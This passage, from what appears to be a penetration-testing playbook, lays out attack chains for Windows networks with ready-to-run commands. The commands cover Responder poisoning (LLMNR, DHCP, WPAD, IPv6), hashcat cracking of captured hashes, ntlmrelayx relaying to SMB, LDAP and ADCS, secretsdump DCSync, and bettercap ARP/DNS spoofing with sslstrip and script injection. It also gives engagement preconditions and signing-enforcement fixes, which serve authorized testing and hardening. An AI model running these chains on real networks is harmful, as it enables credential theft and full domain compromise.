| RPC (TSCH/ICPR) | 135 | per-attack | — | — | TSCH/ICPR sched-task / cert-enroll relay |
| WinRM | 5985 | — | — | — | Relay session (`--no-winrm-server` toggle); limited client flags in survey |

Enforcement reference: ntlmrelayx.py:25 — "to stop this attack is to enforce on the server SPN checks and or signing." Policy: SMB `RequireSecuritySignature=1`, LDAP `RequireLdapSigning=1`, LDAPS+EPA on CA Web, disable NTLMv1.

---

## Attack chains

### Chain A — Poison → capture → offline crack
1. Discover: `nmap --script broadcast-dhcp-discover,broadcast-dhcp6-discover` + `llmnr-resolve`/`broadcast-netbios-master-browser`. 2. Analyze: `python3 Responder.py -I eth0 -Av` before poisoning. 3. Poison/capture: `python3 Responder.py -I eth0 -v` (or `-Pv`). 4. Crack: `hashcat -m 5600 responder.txt` (or `-m 5500` LM); `-b` yields cleartext Basic. 5. Reuse: `nxc smb` / `impacket smbclient.py`. LLMNR-disabled fleets must be poisoned via the DHCP/LLMNRRace path (Chain B).
### Chain B — DHCP takeover → WPAD injection → proxy auth → capture
1. Rogue DHCP: `python3 Responder.py -I eth0 -Pvd` (or `-d`). 2. Victim receives WPAD/pac URL pointing at attacker; baseline with `broadcast-wpad-discover` after confirming new DHCPOFFERs. 3. ProxyAuth: `-P` forces NTLM/Basic → Responder.db. 4. Crack (Chain A step 4) or relay (Chain C). DHCP starvation + `dhcp-discover.mac random` (nmap dhcp-discover.nse) shapes the victim pool if limited — noisy, log it.
### Chain C — Poison → relay (SMB) → machine-account RBCD → DC
1. Relay targets: `nmap -p 445 --script smb2-security-mode` (scripts/smb2-security-mode.nse) → promote `enabled but not required` hosts (`nxc smb --gen-relay-list`, UNVERIFIED locally). 2. Relay: `python3 ntlmrelayx.py -tf relay_targets.txt -smb2support -l ./loot` (single interface) + Responder poison on the same interface. 3. RBCD: `python3 ntlmrelayx.py -t ldap://DC:389 --delegate-access --escalate-user <target>` (`--delegate-access` :421; `--add-computer` :433; `--delegate-target` :422 DN-bypass). 4. S4U2Self/S4U2Proxy via `getST`/`getST.py` (UNVERIFIED here — no getST source read; standard impacket semantics, verify locally). 5. DCSync: `python3 secretsdump.py 'DOMAIN/relayuser:pass@DC' -just-dc` (secretsdump.py:413, :454). Highest-sensitivity step — blast-radius discipline mandatory.
### Chain D — ARP MITM → sslstrip → session/token theft
1. `arp.spoof` both directions, `fullduplex true`, `forwarding true` (arp_spoof.go:58–:89); confirm via `net.sniff` verbose + SNI lists. 2. `dns.spoof` redirects names to attacker (dns_spoof.go:48–:63). 3. `http.proxy` + `sslstrip true` (http_proxy.go:53) captures cleartext; `http.proxy.injectjs` injects JS — cookies/tokens → Chain A/C.
### Chain E — IPv6 takeover (mitm6 logic) → DNS → capture/relay
1. Confirm IPv6 posture: `nmap -6 --script broadcast-dhcp6-discover`. 2. Rogue RA/RDNSS: `python3 Responder.py -I eth0 --rdnss -v` (Responder.py:141) or rogue DHCPv6: `python3 Responder.py -I eth0 --dhcpv6 -vP` (Responder.py:189); bettercap `dhcp6.spoof.domains` (dhcp6_spoof.go:48). 3. Client resolves via attacker → capture or relay (`ntlmrelayx.py -6/--ipv6` :354, `-t ldap://DC:389` RBCD → Chain C). Missing RA Guard/DHCPv6 snooping is the segment finding.
### Chain F — WPAD → WebDAV/auth loop → relay to ADCS ESC8
1. WPAD race: `broadcast-wpad-discover` baseline; `python3 Responder.py -I eth0 -wFv` for forced-auth poisoning. 2. WebDAV loops: `-E/--ErrorCode` returns STATUS_LOGON_FAILURE repeatedly → Responder.db. Relay side: `ntlmrelayx.py -wh/--wpad-host -wa 3` (:350–:352). 3. Relay HTTP→ADCS: `python3 ntlmrelayx.py -t http://CA:80 -i --lootdir ./loot --adcs` (`--adcs` :448; `--template/--altname/--altsid` :450–:452; `--adcs-ces` :449). 4. Certificate → auth as principal; escalates into Chain C if the cert is for a DA-echelon account.

---

## Where this fits in an engagement
- **Precondition 0 — L2 foothold.** Every primitive needs L2 adjacency: drop switch port, conference-room Ethernet, compromised printer/IoT, rogue AP reassociation (bettercap wifi deauth/fake-auth), physical access, or internal WiFi. The report's gating document.
- **Precondition 1 — GPO posture read.** LLMNR/NBT-NS disabled? WPAD blocked? DHCP Guard/RA Guard/DAI on? NetNTLMv1 disabled? SMB/LDAP signing policy? Each is a measurable finding; run the nmap/NXC baselines before firing anything.
- **Noise ladder.** Passive first (`-A` analyze, `net.sniff` verbose, broadcast/NSE discovery), then poisoning, capture, relay, RBCD/DCSync. Each step is in the DACL/event corpus of the target; agree allowed noise before enabling `-F` (auth prompts), `-E` (logon-failure loops), `--dhcpv6` (disruption), or secretsdump.
- **When NOT to run.** Signed SMB + signed LDAP + EPA-enabled CA + DHCP/RA Guard + 802.1X fail-closed = mostly theoretical here; report policy gaps (IPv6 monitoring, MAB, GPO removals) as hardening debt instead of forcing broken chains.
- **Evidence chain.** Every capture, pcap, hash loot dir (`-l/--lootdir` / `-of/--output-file`), relay-target list, and cert is an engagement artifact; store the bettercap session recording alongside the pcap (timestamps align).

---

## Tool reference card
bettercap arp.spoof — arp_spoof.go:37, :54–:89 params, :93 handler | dns.spoof — dns_spoof.go:34, :44–:63 params, :68 handler | dhcp6.spoof — dhcp6_spoof.go:41, :48 domains, :96 ListParam | net.sniff — net_sniff.go:28, :32–:60 params, :77 handler | http.proxy — http_proxy.go:16, :32–:53 params, :57 handler | wifi — wifi/wifi.go:76, :112 interface, :117 recon, :129 bruteforce | ble.recon — ble/ble_recon.go:38 | Responder — Responder.py:89 parser, :105 -I, :121 -A, :177 -d, :189 --dhcpv6, :204 -w, :216 -P, :238 -b | Responder.conf — `[Responder Core]`, `[DHCPv6 Server]`, `[Kerberos]`, `[HTTP Server]`, `[HTTPS Server]` | tools/ — `tools/` listing; MultiRelay.py:85–:89; RunFinger.py:33–:35 | ntlmrelayx — ntlmrelayx.py:293 -t, :319–:325 ports, :350 -wh, :420–:433 LDAP/RBCD, :448–:452 ADCS | smbclient — smbclient.py:35 target, :41 auth, :60 connection | secretsdump — secretsdump.py:413 target, :454 -just-dc, :473 auth | nmap NSE — `broadcast-dhcp-discover`, `broadcast-dhcp6-discover`, `broadcast-dns-service-discovery`, `broadcast-wpad-discover`, `llmnr-resolve`, `broadcast-netbios-master-browser`, `smb2-security-mode`, `dhcp-discover` (scripts/*.nse) | tshark/Zeek — filter anchors verified; field names UNVERIFIED per-field | nxc — `nxc smb --gen-relay-list` UNVERIFIED locally.

## UNVERIFIED / open items
- `jbarcia/relayjuly`-style relay: `gh repo view jbarcia/relayjuly` → 404 Not Found; `gh search repos relayjuly` → empty. Does not exist under that name until a real URL is produced.
- `nxc smb --gen-relay-list`: NetExec not installed in the research env; flag/usage are documented NetExec behavior, not locally verified.
- LDAPS (636) relay success: no LDAPS relay arg observed in the ntlmrelayx.py parser; channel-binding outcomes are environment-dependent.
- CVE references `--remove-mic` (CVE-2019-1040) and `--remove-sign-seal` (CVE-2025-33073) are copied from the ntlmrelayx parser help text.
- 802.1X/VLAN vendor CLI and Yersinia-class tooling: kept at procedure level; no invented tool flags or standard numbers.
- tshark field names + Zeek log conventions + `getST` semantics: standard/UNVERIFIED in this survey; check `tshark -G fields` before automating.
